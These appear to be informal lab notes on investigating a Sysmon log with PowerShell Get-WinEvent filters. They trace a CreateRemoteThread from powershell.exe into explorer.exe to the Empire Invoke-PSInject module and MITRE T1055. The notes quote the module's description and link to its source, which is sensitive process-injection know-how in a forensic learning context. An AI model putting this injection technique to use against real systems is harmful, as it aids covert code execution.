+PS C:\Users\Administrator\Desktop> $start = Get-Date -Date "1/21/2021 5:05:45 PM"
+PS C:\Users\Administrator\Desktop> $end = Get-Date -Date "1/21/2021 5:08:14 PM"
+PS C:\Users\Administrator\Desktop> Get-WinEvent -Path .\sysmonlog.evtx -FilterXPath '*/System/*' | Where-Object { $_.TimeCreated -ge $start -and $_.TimeCreated -le $end } | Sort-Object TimeCreated
+
+SO explaining this: 
+$start and $end are the variable set to -Date acceptable format for each $._TimeCreated
+GreaterThanOrEqualTo -ge 
+LessThanOrEqualTo -le
+AndOperator -and
+
+Similar file, filterxpath(within the -path given) 
+
+TimeCreated                     Id LevelDisplayName Message
+-----------                     -- ---------------- -------
+1/21/2021 5:05:45 PM             1 Information      Process Create:...
+1/21/2021 5:05:46 PM            11 Information      File created:...
+1/21/2021 5:05:46 PM            12 Information      Registry object added or deleted:...
+1/21/2021 5:05:46 PM            12 Information      Registry object added or deleted:...
+1/21/2021 5:05:46 PM            12 Information      Registry object added or deleted:...
+1/21/2021 5:05:46 PM            23 Information      File Delete:...
+1/21/2021 5:05:49 PM             7 Information      Image loaded:...
+1/21/2021 5:05:50 PM             3 Information      Network connection detected:...
+1/21/2021 5:07:06 PM             8 Information      CreateRemoteThread detected:...
+
+...Alot of CreateRemoteThreads Later...
+
+1/21/2021 5:07:06 PM            11 Information      File created:...
+1/21/2021 5:07:06 PM            23 Information      File Delete:...
+1/21/2021 5:07:09 PM             7 Information      Image loaded:...
+1/21/2021 5:07:10 PM             3 Information      Network connection detected:...
+1/21/2021 5:07:40 PM             7 Information      Image loaded:...
+1/21/2021 5:08:09 PM            12 Information      Registry object added or deleted:...
+1/21/2021 5:08:09 PM            12 Information      Registry object added or deleted:...
+1/21/2021 5:08:09 PM            12 Information      Registry object added or deleted:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            11 Information      File created:...
+1/21/2021 5:08:11 PM            13 Information      Registry value set:...
+1/21/2021 5:08:11 PM            13 Information      Registry value set:...
+1/21/2021 5:08:11 PM            13 Information      Registry value set:...
+1/21/2021 5:08:11 PM            13 Information      Registry value set:...
+1/21/2021 5:08:12 PM            13 Information      Registry value set:...
+1/21/2021 5:08:12 PM            13 Information      Registry value set:...
+1/21/2021 5:08:12 PM             1 Information      Process Create:...
+1/21/2021 5:08:13 PM            23 Information      File Delete:...
+1/21/2021 5:08:13 PM            23 Information      File Delete:...
+1/21/2021 5:08:13 PM            23 Information      File Delete:...
+1/21/2021 5:08:13 PM            13 Information      Registry value set:...
+
+
+$remote = Get-Date -Date "1/21/2021 5:07:06 PM"
+ Get-WinEvent -Path .\sysmonlog.evtx -FilterXPath '*/System/EventID=8' | Where-Object { $_.TimeCreated -like $remote } | fl
+
+
+First one UTC time 
+And time created from 
+
+TimeCreated  : 1/21/2021 5:07:06 PM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 8
+Message      : CreateRemoteThread detected:
+               RuleName: -
+               UtcTime: 2021-01-22 01:07:06.182
+               SourceProcessGuid: {786593ca-24e9-600a-eb00-000000000300}
+               SourceProcessId: 3088
+               SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+               TargetProcessGuid: {786593ca-776d-6009-4b00-000000000300}
+               TargetProcessId: 2684
+               TargetImage: C:\Windows\explorer.exe
+               NewThreadId: 4872
+               StartAddress: 0x00000000027D0000
+               StartModule: -
+               StartFunction: -
+
+
+Filter for pid 3088 for next question Not process start, the first one, Thread Create
+
+For next questions I turned to Motasem again, filter Path : Contains : Release procmon
+
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ReleaseId
+HiveKeyLocalMachine... ... CurrentVersion, like asking for uname -a on linux or systeminfo this key contain similar
+The ReleaseID is 1809 for this room
+
+For the next question, click through properties to find stack module called <unknown> 
+
+Invoke-PsInject - we creating a new powershell.exe:
+
+https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/powershell/management/psinject.py
+
+    def __init__(self, mainMenu, params=[]):
+
+        self.info = {
+            'Name': 'Invoke-PSInject',
+
+            'Author': ['@harmj0y', '@sixdub', 'leechristensen (@tifkin_)'],
+
+            'Description': ("Utilizes Powershell to to inject a Stephen Fewer "
+                            "formed ReflectivePick which executes PS code"
+                            "from memory in a remote process"),
+
+
+This technique is called:
+https://attack.mitre.org/techniques/T1055/
